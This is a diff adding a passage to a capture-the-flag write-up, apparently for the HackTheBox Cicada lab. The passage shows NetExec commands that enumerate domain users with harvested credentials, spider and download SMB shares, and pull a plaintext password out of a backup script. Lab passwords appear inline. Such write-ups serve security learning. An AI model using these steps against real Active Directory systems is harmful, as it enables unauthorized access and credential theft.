@@ -180,6 +180,88 @@ LDAP        10.10.11.35     389    CICADA-DC        david.orelious              
 LDAP        10.10.11.35     389    CICADA-DC        emily.oscars                  2024-08-22 22:20:17 2  
 ```
 
+Use `michael`'s credentials to get a more accurate list of users.
+```bash
+nxc ldap 'CICADA-DC' -u 'michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8' --active-users | awk '{print $5}' | grep -v '[\[*|-]' > users.txt
+
+Administrator
+Guest
+john.smoulder
+sarah.dantelia
+michael.wrightson
+david.orelious
+emily.oscars
+```
+
+Spider the files on the SMB server and download them.
+```bash
+xc smb 'CICADA-DC' -u 'david.orelious' -p 'aRt$Lp#7t*VQ!3' -M spider_plus -o DOWNLOAD_FLAG=True 
+
+
+/home/wither/.local/share/pipx/venvs/netexec/lib/python3.13/site-packages/masky/lib/smb.py:6: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
+  from pkg_resources import resource_filename
+SMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False) 
+SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\david.orelious:aRt$Lp#7t*VQ!3 
+SPIDER_PLUS 10.10.11.35     445    CICADA-DC        [*] Started module spidering_plus with the following options:
+SPIDER_PLUS 10.10.11.35     445    CICADA-DC        [*]  DOWNLOAD_FLAG: True
+SPIDER_PLUS 10.10.11.35     445    CICADA-DC        [*]     STATS_FLAG: True
+SPIDER_PLUS 10.10.11.35     445    CICADA-DC        [*] EXCLUDE_FILTER: ['print$', 'ipc$']
+SPIDER_PLUS 10.10.11.35     445    CICADA-DC        [*]   EXCLUDE_EXTS: ['ico', 'lnk']
+SPIDER_PLUS 10.10.11.35     445    CICADA-DC        [*]  MAX_FILE_SIZE: 50 KB
+SPIDER_PLUS 10.10.11.35     445    CICADA-DC        [*]  OUTPUT_FOLDER: /home/wither/.nxc/modules/nxc_spider_plus
+SMB         10.10.11.35     445    CICADA-DC        [*] Enumerated shares
+SMB         10.10.11.35     445    CICADA-DC        Share           Permissions     Remark
+SMB         10.10.11.35     445    CICADA-DC        -----           -----------     ------
+SMB         10.10.11.35     445    CICADA-DC        ADMIN$                          Remote Admin
+SMB         10.10.11.35     445    CICADA-DC        C$                              Default share
+SMB         10.10.11.35     445    CICADA-DC        DEV             READ            
+SMB         10.10.11.35     445    CICADA-DC        HR              READ            
+SMB         10.10.11.35     445    CICADA-DC        IPC$            READ            Remote IPC
+SMB         10.10.11.35     445    CICADA-DC        NETLOGON        READ            Logon server share 
+SMB         10.10.11.35     445    CICADA-DC        SYSVOL          READ            Logon server share 
+SPIDER_PLUS 10.10.11.35     445    CICADA-DC        [+] Saved share-file metadata to "/home/wither/.nxc/modules/nxc_spider_plus/10.10.11.35.json".
+SPIDER_PLUS 10.10.11.35     445    CICADA-DC        [*] SMB Shares:           7 (ADMIN$, C$, DEV, HR, IPC$, NETLOGON, SYSVOL)
+SPIDER_PLUS 10.10.11.35     445    CICADA-DC        [*] SMB Readable Shares:  5 (DEV, HR, IPC$, NETLOGON, SYSVOL)
+SPIDER_PLUS 10.10.11.35     445    CICADA-DC        [*] SMB Filtered Shares:  1
+SPIDER_PLUS 10.10.11.35     445    CICADA-DC        [*] Total folders found:  33
+SPIDER_PLUS 10.10.11.35     445    CICADA-DC        [*] Total files found:    12
+SPIDER_PLUS 10.10.11.35     445    CICADA-DC        [*] File size average:    1.09 KB
+SPIDER_PLUS 10.10.11.35     445    CICADA-DC        [*] File size min:        23 B
+SPIDER_PLUS 10.10.11.35     445    CICADA-DC        [*] File size max:        5.22 KB
+SPIDER_PLUS 10.10.11.35     445    CICADA-DC        [*] File unique exts:     6 (ini, inf, cmtx, pol, ps1, txt)
+SPIDER_PLUS 10.10.11.35     445    CICADA-DC        [*] Unmodified files:     12
+SPIDER_PLUS 10.10.11.35     445    CICADA-DC        [*] All files were not changed.
+SPIDER_PLUS 10.10.11.35     445    CICADA-DC        [+] All files processed successfully.
+```
+
+Copy the files from the newly discovered DEV share.
+```bash
+cp -r /home/wither/.nxc/modules/nxc_spider_plus/10.10.11.35/DEV/* .
+```
+
+It's a backup script that reveals `emily.oscars`'s password `Q!3@Lp#M6b*7t*Vt`.
+```bash
+cat Backup_script.ps1                                              
+
+$sourceDirectory = "C:\smb"
+$destinationDirectory = "D:\Backup"
+
+$username = "emily.oscars"
+$password = ConvertTo-SecureString "Q!3@Lp#M6b*7t*Vt" -AsPlainText -Force
+$credentials = New-Object System.Management.Automation.PSCredential($username, $password)
+$dateStamp = Get-Date -Format "yyyyMMdd_HHmmss"
+$backupFileName = "smb_backup_$dateStamp.zip"
+$backupFilePath = Join-Path -Path $destinationDirectory -ChildPath $backupFileName
+Compress-Archive -Path $sourceDirectory -DestinationPath $backupFilePath
+Write-Host "Backup completed successfully. Backup file saved to: $backupFilePath"
+```
+
+
+
+
+
+
+
 ## Enumeration
 
 
